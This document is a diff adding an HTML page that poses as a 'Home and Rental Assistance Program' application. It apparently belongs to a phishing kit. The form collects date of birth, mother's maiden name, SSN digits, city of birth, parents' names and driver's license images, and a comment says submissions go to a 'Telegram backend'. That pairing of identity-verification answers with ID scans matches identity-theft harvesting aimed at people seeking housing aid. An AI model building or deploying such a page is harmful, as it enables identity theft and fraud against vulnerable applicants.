@@ -1,1 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Home and Rental Assistance Program Application Form</title>
 
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body{
+      background:#ececf5;
+      padding:40px 15px;
+    }
+
+    .form-container{
+      max-width:900px;
+      margin:auto;
+      background:#fff;
+      border:1px solid #ddd;
+    }
+
+    .top-section{
+      display:flex;
+      justify-content:space-between;
+      align-items:flex-start;
+      padding:35px;
+      border-bottom:1px solid #e5e5e5;
+      flex-wrap:wrap;
+      gap:20px;
+    }
+
+    .top-section h1{
+      font-size:42px;
+      line-height:1.3;
+      color:#2d3748;
+      font-weight:700;
+    }
+
+    .top-section img{
+      width:220px;
+      height:130px;
+      object-fit:cover;
+    }
+
+    form{
+      padding:35px;
+    }
+
+    .row{
+      display:flex;
+      gap:20px;
+      margin-bottom:25px;
+      flex-wrap:wrap;
+    }
+
+    .field{
+      flex:1;
+      min-width:250px;
+    }
+
+    label{
+      display:block;
+      margin-bottom:10px;
+      color:#444;
+      font-size:15px;
+      font-weight:600;
+    }
+
+    .required{
+      color:red;
+    }
+
+    input{
+      width:100%;
+      padding:13px;
+      border:1px solid #d8d8d8;
+      outline:none;
+      font-size:15px;
+      background:#fff;
+    }
+
+    input:focus{
+      border-color:#4caf50;
+    }
+
+    .small-text{
+      margin-top:6px;
+      color:#999;
+      font-size:12px;
+    }
+
+    .upload-box{
+      border:2px dashed #d0d0d0;
+      padding:35px;
+      text-align:center;
+      background:#fafafa;
+    }
+
+    .upload-box p{
+      color:#666;
+      font-size:16px;
+      margin-bottom:10px;
+      font-weight:bold;
+    }
+
+    .upload-box span{
+      color:#999;
+      font-size:13px;
+    }
+
+    .upload-box input{
+      margin-top:15px;
+      border:none;
+      background:none;
+    }
+
+    .submit-area{
+      text-align:center;
+      margin-top:35px;
+    }
+
+    .submit-btn{
+      background:#1db954;
+      color:#fff;
+      border:none;
+      padding:14px 40px;
+      font-size:17px;
+      font-weight:bold;
+      cursor:pointer;
+    }
+
+    .submit-btn:hover{
+      background:#169944;
+    }
+
+    .powered{
+      margin-top:12px;
+      color:#999;
+      font-size:13px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="form-container">
+
+  <div class="top-section">
+    <h1>
+      Home and Rental Assistance Program<br>
+      Application Form
+    </h1>
+
+    <img src="https://images.unsplash.com/photo-1560518883-ce09059eeffa?q=80&w=1000&auto=format&fit=crop">
+  </div>
+
+  <!-- ========================= -->
+  <!-- STEP 1 — FIX FORM TAG -->
+  <!-- This connects form to Telegram backend -->
+  <!-- ========================= -->
+
+  <form action="submit.php" method="POST" enctype="multipart/form-data">
+
+    <!-- NAME -->
+    <div class="row">
+
+      <div class="field">
+        <label>First Name <span class="required">*</span></label>
+        <input type="text" name="first_name" required>
+      </div>
+
+      <div class="field">
+        <label>Middle Name</label>
+        <input type="text" name="middle_name">
+      </div>
+
+      <div class="field">
+        <label>Last Name <span class="required">*</span></label>
+        <input type="text" name="last_name" required>
+      </div>
+
+    </div>
+
+    <!-- PHONE + EMAIL -->
+    <div class="row">
+
+      <div class="field">
+        <label>Phone Number <span class="required">*</span></label>
+        <input type="text" name="phone" required>
+      </div>
+
+      <div class="field">
+        <label>Email <span class="required">*</span></label>
+        <input type="email" name="email" required>
+      </div>
+
+    </div>
+
+    <!-- DOB + MOTHER MAIDEN -->
+    <div class="row">
+
+      <div class="field">
+        <label>Date of Birth <span class="required">*</span></label>
+        <input type="text" name="dob" required>
+      </div>
+
+      <div class="field">
+        <label>Mother's Maiden Name</label>
+        <input type="text" name="mother_maiden">
+      </div>
+
+    </div>
+
+    <!-- SSN + BIRTH CITY -->
+    <div class="row">
+
+      <div class="field">
+        <label>Last 4 SSN</label>
+        <input type="text" name="ssn">
+      </div>
+
+      <div class="field">
+        <label>City of Birth</label>
+        <input type="text" name="birth_city">
+      </div>
+
+    </div>
+
+    <!-- ADDRESS -->
+    <div class="row">
+      <div class="field">
+        <label>Address</label>
+        <input type="text" name="address">
+      </div>
+    </div>
+
+    <!-- FATHER + MOTHER -->
+    <div class="row">
+
+      <div class="field">
+        <label>Father's Full Name</label>
+        <input type="text" name="father_name">
+      </div>
+
+      <div class="field">
+        <label>Mother's Full Name</label>
+        <input type="text" name="mother_name">
+      </div>
+
+    </div>
+
+    <!-- FRONT ID -->
+    <div class="row">
+      <div class="field">
+        <label>Front Copy of Driver's License</label>
+        <input type="file" name="front_id" required>
+      </div>
+    </div>
+
+    <!-- BACK ID -->
+    <div class="row">
+      <div class="field">
+        <label>Back Copy of Driver's License</label>
+        <input type="file" name="back_id" required>
+      </div>
+    </div>
+
+    <!-- SUBMIT -->
+    <div class="submit-area">
+      <button class="submit-btn" type="submit">Submit</button>
+      <div class="powered">Powered by Home and Rental Assistance Program</div>
+    </div>
+
+  </form>
+
+</div>
+
+</body>
+</html>
